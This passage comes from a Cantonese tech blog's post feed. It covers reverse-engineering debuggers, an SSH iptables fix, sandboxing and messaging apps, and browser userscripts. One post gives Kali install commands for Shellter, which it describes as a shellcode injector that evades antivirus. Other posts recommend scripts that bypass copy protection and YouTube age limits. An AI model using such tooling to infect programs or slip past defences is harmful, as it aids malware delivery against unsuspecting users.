    <content><![CDATA[<h1 id="何謂逆向工程？"><a href="#何謂逆向工程？" class="headerlink" title="何謂逆向工程？"></a>何謂逆向工程？</h1><p>逆向工程(Reverse Engineering)，又稱反向工程，是一種技術過程，即對一專案標產品進行逆向分析及研究，從而演繹並得出該產品的處理流程、組織結構、功能效能規格等設計要素，以製作出功能相近，但又不完全一樣的產品。逆向工程源於商業及軍事領域中的硬體分析。其主要目的是，在無法輕易獲得必要的生產資訊下，直接從成品的分析，推導產品的設計原理。</p>
<p>逆向工程可能會被誤認為是對智慧財產權的嚴重侵害，但是在實際應用上，反而可能會保護智慧財產權所有者。例如在積體電路領域，如果懷疑某公司侵犯智慧財產權，可以用逆向工程技術來尋找證據。 </p>
<h1 id="1-IDA"><a href="#1-IDA" class="headerlink" title="1. IDA"></a>1. <a href="https://hex-rays.com/">IDA</a></h1><img src="idapro.png" width="200" height="200"/>

<p>Hex-Rays 由 Ilfak Guilfanov 於 2005 年創立，他是一名軟件開發人員、計算機安全研究員，擁有包括世界知名的 IDA Disassembler 和 Debugger 在內的多個備受推崇的軟件包的知名高級架構師。 這個最先進的工具是由一個有能力的二進製程序分析團隊不斷開發的。 在 Hex-Rays，我們珍視創新，使工具更強大，並努力站在建立二進制分析未來的最前沿。 </p>
<img src="/2022/01/09/Reverse-engineering-tools/ida-pro.png" class="">

<h1 id="2-x64dbg"><a href="#2-x64dbg" class="headerlink" title="2. x64dbg"></a>2. <a href="https://x64dbg.com/">x64dbg</a></h1><img src="x64dbgg.png" width="200" height="200"/>

<p>Github : <a href="https://github.com/x64dbg/x64dbg">https://github.com/x64dbg/x64dbg</a></p>
<p>適用於 Windows 的開源二進制調試器，旨在對您沒有源代碼的可執行文件進行惡意軟件分析和逆向工程。 </p>
<img src="/2022/01/09/Reverse-engineering-tools/x64dbg.png" class="">
<img src="/2022/01/09/Reverse-engineering-tools/x64dbg-2.png" class="">
<img src="/2022/01/09/Reverse-engineering-tools/x64dbg-3.png" class="">

<h1 id="3-dnSpy-Lastest"><a href="#3-dnSpy-Lastest" class="headerlink" title="3. dnSpy - Lastest"></a>3. dnSpy - <a href="https://github.com/dnSpy/dnSpy/releases">Lastest</a></h1><p><a href="https://github.com/dnSpy/dnSpy">dnSpy</a> 是一個調試器和 .NET 程序集編輯器。 即使您沒有任何可用的源代碼，您也可以使用它來編輯和調試程序集。 主要特點：</p>
<ul>
<li>調試 .NET 和 Unity 程序集</li>
<li>編輯 .NET 和 Unity 程序集</li>
<li>明暗主題</li>
</ul>
<img src="/2022/01/09/Reverse-engineering-tools/dnspy.gif" class="">
<img src="/2022/01/09/Reverse-engineering-tools/dnspy-2.gif" class="">

<h2 id="dnSpy-Building"><a href="#dnSpy-Building" class="headerlink" title="dnSpy (Building)"></a>dnSpy (Building)</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone --recursive https://github.com/dnSpy/dnSpy.git</span><br><span class="line">cd dnSpy</span><br><span class="line"><span class="meta">#</span><span class="bash"> or dotnet build</span></span><br><span class="line">./build.ps1 -NoMsbuild</span><br></pre></td></tr></table></figure>

<h2 id="Debugger"><a href="#Debugger" class="headerlink" title="Debugger"></a>Debugger</h2><ul>
<li>Debug .NET Framework, .NET and Unity game assemblies, no source code required</li>
<li>Set breakpoints and step into any assembly</li>
<li>Locals, watch, autos windows</li>
<li>Variables windows support saving variables (eg. decrypted byte arrays) to disk or view them in the hex editor (memory window)</li>
<li>Object IDs</li>
<li>Multiple processes can be debugged at the same time</li>
<li>Break on module load</li>
<li>Tracepoints and conditional breakpoints</li>
<li>Export/import breakpoints and tracepoints</li>
<li>Call stack, threads, modules, processes windows</li>
<li>Break on thrown exceptions (1st chance)</li>
<li>Variables windows support evaluating C# / Visual Basic expressions</li>
<li>Dynamic modules can be debugged (but not dynamic methods due to CLR limitations)</li>
<li>Output window logs various debugging events, and it shows timestamps by default :)</li>
<li>Assemblies that decrypt themselves at runtime can be debugged, dnSpy will use the in-memory image. You can also force dnSpy to always use in-memory images instead of disk files.</li>
<li>Public API, you can write an extension or use the C# Interactive window to control the debugger</li>
</ul>
]]></content>
      <categories>
        <category>Reverse engineering</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH - 連接被拒絕錯誤</title>
    <url>/2022/01/22/SSH-Fix-Connection-refused-error/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>平時我地第一次入去 VPS 係正常，<br>但當你入去第2次既時候就唔會入到，<br>原因係佢原本就 set 左你唔俾其他人入，<br>呢個我諗係基於安全理由先咁做</p>
<h2 id="解決"><a href="#解決" class="headerlink" title="解決"></a>解決</h2><p>要解決呢個問題非常簡單，<br>只要將 Port 22 既 reject 改返做 Accept就得。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Sandboxie - 虛擬沙盒隔離軟件</title>
    <url>/2022/06/17/Sandboxie-Apps/</url>
    <content><![CDATA[<img src="/2022/06/17/Sandboxie-Apps/cover.png" class="">

<h1 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h1><p>Sandboxie 是一款沙盒的隔離軟件，適用於 32 位和 64 位基於 Windows NT 的操作系統。<br>可以創建一個類似沙盒的隔離操作環境，可以在其中運行或安裝應用程序，而無需永久修改本地和映射驅動器或 Windows 註冊表。<br>隔離的虛擬環境允許對不受信任的程序和網上沖浪進行受控測試。</p>
<h1 id="官方網站"><a href="#官方網站" class="headerlink" title="官方網站"></a>官方網站</h1><blockquote>
<p>Github : <a href="https://github.com/sandboxie-plus/Sandboxie">https://github.com/sandboxie-plus/Sandboxie</a><br>網站 : <a href="https://sandboxie-plus.com/">https://sandboxie-plus.com/</a></p>
</blockquote>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>Sandboxie 有分開兩個版本，另外如果安裝 Plus 版本是會幫你安裝 Classic 版本的，兩者都可以使用。</p>
<ul>
<li>Sandboxie Plus</li>
<li>Sandboxie Classic</li>
</ul>
<h2 id="兩者分別"><a href="#兩者分別" class="headerlink" title="兩者分別"></a><strong><span style="font-size:larger;">兩者分別</span></strong></h2><table>
<thead>
<tr>
<th><strong>版本</strong></th>
<th><strong>UI 介面</strong></th>
<th><strong>沙箱等級</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Plus</strong></td>
<td>使用 QT 製作，有 Debug 介面，更多詳細內容。</td>
<td>五個</td>
</tr>
<tr>
<td><strong>Classic</strong></td>
<td>相比起 Plus 版本，沒有什麼特別。</td>
<td>一個</td>
</tr>
</tbody></table>
<h3 id="UI-介面分別"><a href="#UI-介面分別" class="headerlink" title="UI 介面分別"></a>UI 介面分別</h3><p>下圖是 Plus 版本，最大分別會是 UI 使用了 Qt，介面比起 Classic 美麗得多，還多了一個 debug 介面。</p>
<img src="/2022/06/17/Sandboxie-Apps/9.png" class="">

<p>下圖是 Classic 版本，看起來更小，不過功能也是有的，你也能隔開程式。</p>
<img src="/2022/06/17/Sandboxie-Apps/x.png" class="">


<h3 id="沙箱等級"><a href="#沙箱等級" class="headerlink" title="沙箱等級"></a>沙箱等級</h3><p>然後沙箱等級比起 Classic 多了 5 個，這邊 Classic 版本是沒有的。</p>
<img src="/2022/06/17/Sandboxie-Apps/11.png" class="">

<h1 id="下載系統需求"><a href="#下載系統需求" class="headerlink" title="下載系統需求"></a>下載系統需求</h1><ul>
<li>Windows 7</li>
<li>Windows 8</li>
<li>Windows 10</li>
<li>Windows 11</li>
</ul>
<h2 id="下載檔案"><a href="#下載檔案" class="headerlink" title="下載檔案"></a>下載檔案</h2><blockquote>
<p>網站 : <a href="https://sandboxie-plus.com/downloads/">https://sandboxie-plus.com/downloads/</a><br>Github : <a href="https://github.com/sandboxie-plus/Sandboxie/releases/tag/1.0.22">https://github.com/sandboxie-plus/Sandboxie/releases/tag/1.0.22</a></p>
</blockquote>
<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><p>兩個非常強又實用的功能 : </p>
<ul>
<li>防火牆 - 每個沙盒都有一個新的防火牆</li>
<li>快照管理器 - 可以即時還原工作程序</li>
</ul>
<h1 id="開啟檔案"><a href="#開啟檔案" class="headerlink" title="開啟檔案"></a>開啟檔案</h1><p>當你將檔案拉到沙盒內，已被沙盒隔壁保護的檔案的外框會出現黃色框。</p>
<img src="/2022/06/17/Sandboxie-Apps/hi.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>推薦工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Session Messenger - 匿名加密通訊程式</title>
    <url>/2022/05/24/Session-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="Session Messenger" src="cover.png" width="200px"/>
    <h1 align="center">Session Messenger</h1>
</p>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Session 是免費和開源的，<br>是由非營利性 Oxen Privacy Tech Foundation 開發的跨平台去中心化加密即時通訊服務，<br>它基於開源信號協議。<br>用戶可以發送一對一和群組消息，<br>其中可以包括文件、語音筆記、圖像和影片。</p>
<p><a href="https://getsession.org/">https://getsession.org/</a></p>
<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><ul>
<li>No Phone Numbers</li>
<li>No Data Breaches</li>
<li>No Foodprints</li>
<li>Open Sources (Github)</li>
<li>Censorship Resistant</li>
<li>end to end encrypted messages</li>
</ul>
<h1 id="申請帳號"><a href="#申請帳號" class="headerlink" title="申請帳號"></a>申請帳號</h1><p>Session 使用 Session ID 作為標識符，並通過端到端加密保護與其他 Session 用戶的所有通信。</p>
<p>開啟帳號只需要幾秒鐘，即時一生一串 ID 作為登入帳號，<br>不用任何個人資料就能輕鬆申請。</p>
<h1 id="支援系統"><a href="#支援系統" class="headerlink" title="支援系統"></a>支援系統</h1><ul>
<li>Linux</li>
<li>MacOS</li>
<li>Windows</li>
<li>IOS</li>
<li>Android</li>
</ul>
<p>Session 擁有適用於 iOS 和 Android 的官方客戶端應用程序以及適用於 Windows、macOS 和 Linux 的桌面應用程序。</p>
]]></content>
      <categories>
        <category>匿名</category>
      </categories>
      <tags>
        <tag>程式</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Liunx - 安裝 Shellter (Shellcode 注入)</title>
    <url>/2022/05/17/Shellter-commands/</url>
    <content><![CDATA[<img src="logo.svg" width="200px"/>

<h1 id="Shellter-介紹"><a href="#Shellter-介紹" class="headerlink" title="Shellter 介紹"></a>Shellter 介紹</h1><p>Shellter 是一個動態 shellcode 注入工具，又名動態 PE 感染器。 它可用於將 shellcode 注入本機 Windows 應用程序（目前僅限 32 位應用程序）。 shellcode 可以是你的，也可以是通過框架生成的，例如 Metasploit。</p>
<p>Shellter 利用了 PE 文件的原始結構，並且不應用任何修改，例如在部分中更改內存訪問權限（除非用戶想要），添加具有 RWE 訪問權限的額外部分，以及在 AV 下看起來不可靠的任何內容 掃描。</p>
<p>一個可以 Bypass 防毒偵查的注入程式工具。</p>
<h1 id="安裝-Shellter-需求"><a href="#安裝-Shellter-需求" class="headerlink" title="安裝 Shellter 需求"></a>安裝 Shellter 需求</h1><blockquote>
<p>Shellter 只有幾個系統支援，而其他系統是不能安裝。<br>官網 : <a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a></p>
</blockquote>
<ul>
<li>KALI</li>
<li>BackBox</li>
<li>Arch</li>
<li>Debian</li>
<li>Windows 系統</li>
</ul>
<h1 id="安裝-Shellter"><a href="#安裝-Shellter" class="headerlink" title="安裝 Shellter"></a>安裝 Shellter</h1><hr>
<h2 id="Step-1-dpkg-加入-32-位元"><a href="#Step-1-dpkg-加入-32-位元" class="headerlink" title="Step 1 : dpkg 加入 32 位元"></a>Step 1 : dpkg 加入 32 位元</h2><p>Shellter 只有 32 位元，所以請輸入以下指令啟動 32 位元。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# dpkg --add-architecture i386</span><br></pre></td></tr></table></figure>

<img src="/2022/05/17/Shellter-commands/dpkg.png" class="">

<h2 id="Step-2-更新-APT"><a href="#Step-2-更新-APT" class="headerlink" title="Step 2 : 更新 APT"></a>Step 2 : 更新 APT</h2><p>將 APT 更新，確保是最新狀態。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# apt update -y</span><br></pre></td></tr></table></figure>

<img src="/2022/05/17/Shellter-commands/apt%20update%20-y.png" class="">

<h2 id="Step-3-安裝-wine"><a href="#Step-3-安裝-wine" class="headerlink" title="Step 3 : 安裝 wine"></a>Step 3 : 安裝 wine</h2><p>如要運行 <code>.exe</code> 檔案，需要安裝 <code>wine</code>，輸入以下指令安裝 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# apt install wine32 -y</span><br></pre></td></tr></table></figure>

<img src="/2022/05/17/Shellter-commands/wine32%20install%20-y.png" class="">

<h2 id="Step-4-安裝-Shellter"><a href="#Step-4-安裝-Shellter" class="headerlink" title="Step 4 : 安裝 Shellter"></a>Step 4 : 安裝 Shellter</h2><p>到這步驟是真正安裝 Shellter 的時候，輸入以下指令安裝 :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# sudo apt install shellter -y</span><br></pre></td></tr></table></figure>

<img src="/2022/05/17/Shellter-commands/i.png" class="">

<h2 id="Step-4-啟動-Shellter"><a href="#Step-4-啟動-Shellter" class="headerlink" title="Step 4 : 啟動 Shellter"></a>Step 4 : 啟動 Shellter</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# shellter</span><br></pre></td></tr></table></figure>

<img src="/2022/05/17/Shellter-commands/program.png" class="">]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Tampermonkey 瀏覽器插件 - 連登插件</title>
    <url>/2021/12/17/Tampermonkey-Extensions-lihkg/</url>
    <content><![CDATA[<img src="lihkg.svg" width="200px"/>

<h1 id="Tampermonkey-連登插件"><a href="#Tampermonkey-連登插件" class="headerlink" title="Tampermonkey 連登插件"></a>Tampermonkey 連登插件</h1><p>以下連結會帶你去到官方網站或者 Github。</p>
<ul>
<li><a href="https://lihkg.com/thread/1268574/page/1">【LIHKG User Script】顯示回覆用戶資料 （加強版）</a></li>
<li><a href="https://lihkg.com/thread/2536496/page/1">【LIHKG User Script】【Libel】會員標籤插件</a></li>
<li><a href="https://gist.github.com/kitce/fae24bd06518e8fd68383199cd35e38b">【LIHKG User Script】顯示引用會員資料</a></li>
<li><a href="https://gist.github.com/kitce/c60f6dda93b1dc51d90c8852d7d9f557">【LIHKG User Script】顯示會員資料</a></li>
</ul>
<h1 id="LIHKG-User-Script-顯示回覆用戶資料-（加強版）"><a href="#LIHKG-User-Script-顯示回覆用戶資料-（加強版）" class="headerlink" title="[LIHKG User Script] 顯示回覆用戶資料 （加強版）"></a>[LIHKG User Script] 顯示回覆用戶資料 （加強版）</h1><p>【作者】：<a href="https://lihkg.com/profile/23094">髀加蕉</a><br>【Post】：<a href="https://lihkg.com/thread/1268574/page/1">https://lihkg.com/thread/1268574/page/1</a><br>【下載】：<a href="https://gist.github.com/kitce/c60f6dda93b1dc51d90c8852d7d9f557">https://gist.github.com/kitce/c60f6dda93b1dc51d90c8852d7d9f557</a></p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
<li>可以顯示用戶註冊日期，超過某個日期會Highlight咗</li>
<li>按自己需要修改 WARN_REGISTRATION_TIME_THRESHOLD 日期</li>
</ul>
<hr style="border:2px solid grey"></hr>

<h1 id="【LIHKG-User-Script】【Libel】會員標籤插件"><a href="#【LIHKG-User-Script】【Libel】會員標籤插件" class="headerlink" title="【LIHKG User Script】【Libel】會員標籤插件"></a>【LIHKG User Script】【Libel】會員標籤插件</h1><p>【作者】：<a href="https://lihkg.com/profile/23094">髀加蕉</a><br>【官網】：<a href="https://kitce.github.io/libel/">https://kitce.github.io/libel/</a><br>【Post】：<a href="https://lihkg.com/thread/2536496/page/1">https://lihkg.com/thread/2536496/page/1</a><br>【下載】：<a href="https://kitce.github.io/libel/dist/libel.user.js">https://kitce.github.io/libel/dist/libel.user.js</a></p>
<h2 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h2><ul>
<li>標籤記錄</li>
<li>狙擊會員</li>
<li>標籤訂閱</li>
<li>匯出／匯入</li>
</ul>
<img src="/2021/12/17/Tampermonkey-Extensions-lihkg/tags.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="【LIHKG-User-Script】顯示引用會員資料"><a href="#【LIHKG-User-Script】顯示引用會員資料" class="headerlink" title="【LIHKG User Script】顯示引用會員資料"></a>【LIHKG User Script】顯示引用會員資料</h1><p>【作者】：<a href="https://lihkg.com/profile/23094">髀加蕉</a><br>【官網】：<a href="https://kitce.github.io/libel/">https://kitce.github.io/libel/</a><br>【Post】：<a href="https://lihkg.com/thread/2536496/page/1">https://lihkg.com/thread/2536496/page/1</a><br>【下載】：<a href="https://gist.github.com/kitce/fae24bd06518e8fd68383199cd35e38b">https://gist.github.com/kitce/fae24bd06518e8fd68383199cd35e38b</a></p>
<h2 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h2><img src="/2021/12/17/Tampermonkey-Extensions-lihkg/info%20quote.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="【LIHKG-User-Script】顯示會員資料"><a href="#【LIHKG-User-Script】顯示會員資料" class="headerlink" title="【LIHKG User Script】顯示會員資料"></a>【LIHKG User Script】顯示會員資料</h1><p>【作者】：<a href="https://lihkg.com/profile/23094">髀加蕉</a><br>【下載】：<a href="https://gist.github.com/kitce/c60f6dda93b1dc51d90c8852d7d9f557">https://gist.github.com/kitce/c60f6dda93b1dc51d90c8852d7d9f557</a></p>
<h2 id="功能-3"><a href="#功能-3" class="headerlink" title="功能"></a>功能</h2><img src="/2021/12/17/Tampermonkey-Extensions-lihkg/show%20info.png" class="">]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
        <tag>Tampermonkey</tag>
      </tags>
  </entry>
  <entry>
    <title>Tampermonkey - 插件推薦 (其他)</title>
    <url>/2022/02/08/Tampermonkey-extensions-others/</url>
    <content><![CDATA[<img src="/img/Post/image/Tampermonkey/cover.png" width="200px"/>

<h1 id="Absolute-Enable-Right-Click-amp-Copy"><a href="#Absolute-Enable-Right-Click-amp-Copy" class="headerlink" title="Absolute Enable Right Click &amp; Copy"></a>Absolute Enable Right Click &amp; Copy</h1><p>有d 網站會 Block 左唔俾你 右 Click 或者 唔俾你 Copy 或者兩樣都唔俾你做。<br>如果你識用 F12 Copy 就話姐，但係咁樣都係好撚麻煩- -<br>所以我地可以用呢個插件 幫我解除呢個網站俾我既限制</p>
<p>【腳本名稱】：Absolute Enable Right Click &amp; Copy<br>【腳本作者】：<a href="https://greasyfork.org/en/users/71477-absolute">Absolute</a><br>【下載網站】：<a href="https://greasyfork.org/en/scripts/23772-absolute-enable-right-click-copy">按這裡</a><br>【腳本語言】：英文</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
<li>刪除複製文本保護。</li>
<li>允許複製和突出顯示。</li>
<li>強制啟用右鍵單擊按鈕。</li>
<li>支持選擇/複製/剪切/粘貼。</li>
<li>重新啟用上下文菜單。</li>
<li>禁用煩人的對話框消息（無法複製此網頁上的內容）。</li>
<li>包括“絕對右鍵單擊模式”以強制刪除任何類型的保護。</li>
<li>此腳本已在具有不同文本保護的不同站點上進行了測試。</li>
<li>幾乎適用於所有網站。</li>
</ul>


<img src="/2022/02/08/Tampermonkey-extensions-others/enable-rcandc.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="anti-anti-copy"><a href="#anti-anti-copy" class="headerlink" title="anti-anti-copy"></a>anti-anti-copy</h1><p>同上面一樣，呢個係解除網站唔俾你 Copy 既限制 (得解除 Copy)</p>
<p>【腳本名稱】：Return YouTube Dislike<br>【腳本作者】：<a href="https://greasyfork.org/en/users/7949-account-login">account-login</a><br>【下載網站】：<a href="https://greasyfork.org/en/scripts/7197-anti-anti-copy">按這裡</a><br>【腳本語言】：英文</p>
<img src="/2022/02/08/Tampermonkey-extensions-others/en.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="Bypass-All-Shortlinks"><a href="#Bypass-All-Shortlinks" class="headerlink" title="Bypass All Shortlinks"></a>Bypass All Shortlinks</h1><p>呢個 Extensions 可以幫你自動 Bypass 所有短網址連結，例如 <code>bit.ly</code>, <code>goo.gl</code>。</p>
<p>【腳本名稱】：Bypass All Shortlinks<br>【腳本作者】：<a href="https://greasyfork.org/en/users/810571-bloggerpemula">bloggerpemula</a><br>【下載網站】：<a href="https://greasyfork.org/en/scripts/431691-bypass-all-shortlinks">按這裡</a><br>【腳本語言】：英文</p>
<p><img src="url-bypass.png"></p>
]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
        <tag>Tampermonkey</tag>
      </tags>
  </entry>
  <entry>
    <title>Tampermonkey - 插件推薦 (Youtube)</title>
    <url>/2022/02/08/Tampermonkey-extensions-youtube/</url>
    <content><![CDATA[<img src="/img/Post/image/Tampermonkey/cover.png" width="200px"/>

<h1 id="YouTube-年齡限制-Bypass"><a href="#YouTube-年齡限制-Bypass" class="headerlink" title="YouTube 年齡限制 Bypass"></a>YouTube 年齡限制 Bypass</h1><p>有時想睇條片，但係條片話18歲以上先可以睇，仲要你登入，咁咪好撚麻煩？<br>但係唔緊要，只要我地裝呢個 Extensions 就可以 解除呢個限制</p>
<p>【腳本名稱】：Simple YouTube Age Restriction Bypass<br>【腳本作者】：<a href="https://greasyfork.org/en/users/750594-zerodytrash">zerodytrash</a><br>【Github】：<a href="https://github.com/zerodytrash/Simple-YouTube-Age-Restriction-Bypass">按這裡</a><br>【下載網站】：<a href="https://greasyfork.org/en/scripts/423851-simple-youtube-age-restriction-bypass">按這裡</a><br>【腳本語言】：英文</p>
<img src="/2022/02/08/Tampermonkey-extensions-youtube/ytagebypass.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="Youtube-Search-While-Watching-Video"><a href="#Youtube-Search-While-Watching-Video" class="headerlink" title="Youtube - Search While Watching Video"></a>Youtube - Search While Watching Video</h1><p>有時睇緊片你又唔想開另一頁去Serach 你想喺 Youtube 既片？<br>呢個插件可以幫到你！</p>
<p>【腳本名稱】：Youtube - Search While Watching Video<br>【腳本作者】：<a href="https://greasyfork.org/en/users/16080-cptmathix">Cptmathix</a><br>【下載網站】：<a href="https://greasyfork.org/en/scripts/29451-youtube-search-while-watching-video">按這裡</a><br>【腳本語言】：英文</p>
<img src="wsearchplay.gif" title="" style="" width="900px">

<hr style="border:2px solid grey"></hr>

<h1 id="Youtube-封面"><a href="#Youtube-封面" class="headerlink" title="Youtube 封面"></a>Youtube 封面</h1><p>你想喺 Youtube 搵你而加睇緊既片既封面圖？<br>呢個插件會幫到你！</p>
<p>【腳本名稱】：Youtube 封面<br>【腳本作者】：<a href="https://greasyfork.org/en/users/16080-cptmathix">Cptmathix</a><br>【下載網站】：<a href="https://greasyfork.org/zh-TW/scripts/420140-youtube-%E5%B0%81%E9%9D%A2">按這裡</a><br>【腳本語言】：英文</p>
<img src="/2022/02/08/Tampermonkey-extensions-youtube/yt-cover.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="youtube-繼續播放"><a href="#youtube-繼續播放" class="headerlink" title="youtube 繼續播放"></a>youtube 繼續播放</h1><p>有時你喺另一個Windows做左好耐野 但係你又係聽緊歌。<br>又或者你本身已經掛緊機，但又唔想 Youtube 播緊既野 自動停 ?<br>呢個插件會幫到你解決！</p>
<p>【腳本名稱】：youtube continue play<br>【腳本作者】：<a href="https://greasyfork.org/en/users/461233-jack850628">jack850628</a><br>【下載網站】：<a href="https://greasyfork.org/en/scripts/398142-youtube-continue-play">按這裡</a><br>【腳本語言】：英文</p>
<img src="/2022/02/08/Tampermonkey-extensions-youtube/youtube-continue-play.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="Return-YouTube-Dislike"><a href="#Return-YouTube-Dislike" class="headerlink" title="Return YouTube Dislike"></a>Return YouTube Dislike</h1><p>而加既 Youtube 會 Hide 左 條片既 Dislike 數，<br>但係明明可能你會睇 Dislike數去判斷條片既質素，<br>咁做真係搞到好麻煩，<br>但係唔緊要！<br>呢個插件幫到你解決！</p>
<p>【腳本名稱】：Return YouTube Dislike<br>【腳本作者】：<a href="https://github.com/Anarios">Anarios</a><br>【Github】：<a href="https://github.com/Anarios/return-youtube-dislike">按這裡</a><br>【下載網站】：<a href="https://www.returnyoutubedislike.com/">按這裡</a><br>【腳本語言】：英文</p>
<img src="/2022/02/08/Tampermonkey-extensions-youtube/return-yt-dislike.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="本地-YouTube-下載器"><a href="#本地-YouTube-下載器" class="headerlink" title="本地 YouTube 下載器"></a>本地 YouTube 下載器</h1><p>喺每一個 Youtube 簡介個個位置會出多左個 Options，內容係俾你選擇呢條片既所有畫質影片，音質既歌，之後你只要撳一下就可以進行下載。</p>
<p>【腳本名稱】：Local YouTube Downloader<br>【腳本作者】：<a href="https://greasyfork.org/en/users/72365-maple3142">maple3142</a><br>【Github】：<a href="https://github.com/Anarios/return-youtube-dislike">按這裡</a><br>【下載網站】：<a href="https://greasyfork.org/en/scripts/369400-local-youtube-downloader">按這裡</a><br>【腳本語言】：繁體中文，英文</p>
<img src="/2022/02/08/Tampermonkey-extensions-youtube/download.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="YouTube-CPU-Tamer"><a href="#YouTube-CPU-Tamer" class="headerlink" title="YouTube CPU Tamer"></a>YouTube CPU Tamer</h1><p>你用 Youtube 睇片既時候，其實係用緊你唔小既 CPU。<br>而呢個 Extensions 係幫你減低 CPU 既使用率。</p>
<p>【腳本名稱】：YouTube CPU Tamer<br>【腳本作者】：<a href="https://greasyfork.org/en/users/78927-knoa">knoa</a><br>【下載網站】：<a href="https://greasyfork.org/en/scripts/418283-youtube-cpu-tamer">按這裡</a><br>【腳本語言】：殘體，日文</p>
<p><img src="cpu.png"></p>
<hr style="border:2px solid grey"></hr>

<h1 id="Youtube-HD"><a href="#Youtube-HD" class="headerlink" title="Youtube HD"></a>Youtube HD</h1><p>有時睇片既時候唔想慢慢撳黎撳去選擇 1080p 既話，咁用呢個插件就可以幫你自動選擇 1080p 畫質 (如果有既話)。</p>
<p>【腳本名稱】：Youtube HD<br>【腳本作者】：<a href="https://greasyfork.org/zh-TW/users/41831-adisib">adisib</a><br>【下載網站】：<a href="https://greasyfork.org/zh-TW/scripts/23661-youtube-hdr">按這裡</a><br>【腳本語言】：英文</p>
<p><img src="hd.png"></p>
]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
        <tag>Tampermonkey</tag>
      </tags>
  </entry>
  <entry>
    <title>Telegram - 通訊程式</title>
    <url>/2022/05/24/Telegram-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="Telegram" src="cover.png" width="200px"/>
    <h1 align="center">Telegram</h1>
</p>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Telegram (簡稱TG)，<br>係一個非常方便又可以做到匿名既程式，<br>申請需要用到電話號碼，<br>當你申請完既時候，<br>你可以將電話號碼隱藏。</p>
<p><a href="https://telegram.org/">https://telegram.org/</a></p>
<h2 id="1-Secret-Chats"><a href="#1-Secret-Chats" class="headerlink" title="1. Secret Chats"></a>1. Secret Chats</h2><p>雖然 Telegram 聊天都是客戶端-服務器加密的，<br>但默認聊天仍存儲在 Telegram 的服務器上。<br>這可以方便地讓您在多個設備上訪問您的消息，<br>但它可能會引發隱私問題。</p>
<p>為了最大限度地保護隱私，您可以創建使用端到端加密的秘密聊天。 (Secret Chats)<br>這些不存儲在 Telegram 的服務器上，因此您只能使用您的特定手機訪問它們。<br>如果一方刪除一條消息，它會在兩台設備上消失，<br>如果您願意，您可以為所有媒體指定自毀期。</p>
<p>最神奇的地方是，<br>當你使用 手機A 開啟 Secret Chat 的時候，<br>你再用 手機B 開啟 Telegram 是並不會發現到你在 手機A 開啟的 Secret Chat的，<br>你只能用 手機A 看到對話。</p>
<h2 id="2-自動刪除帳號"><a href="#2-自動刪除帳號" class="headerlink" title="2. 自動刪除帳號"></a>2. 自動刪除帳號</h2><p>當你的帳號不使用你所設置的限期外的時候，<br>帳號將會自動刪除。</p>
<p>選擇有:</p>
<ul>
<li>一個月</li>
<li>三個月</li>
<li>六個月</li>
<li>一年</li>
</ul>
<h2 id="3-Chat-Folders"><a href="#3-Chat-Folders" class="headerlink" title="3. Chat Folders"></a>3. Chat Folders</h2><p>這是一個非常方便你對話的功能。</p>
<p>當你的對話有很多的時候，<br>你使用這功能後可以令你的對話分類，<br>例如將 Channal，Personal，Bot，<br>分開成三個 Folder。</p>
<h2 id="4-Save-Messages"><a href="#4-Save-Messages" class="headerlink" title="4. Save Messages"></a>4. Save Messages</h2><p>用於儲存你的所有檔案，文件，<br>上限是 2GB (TG 最大上限)。</p>
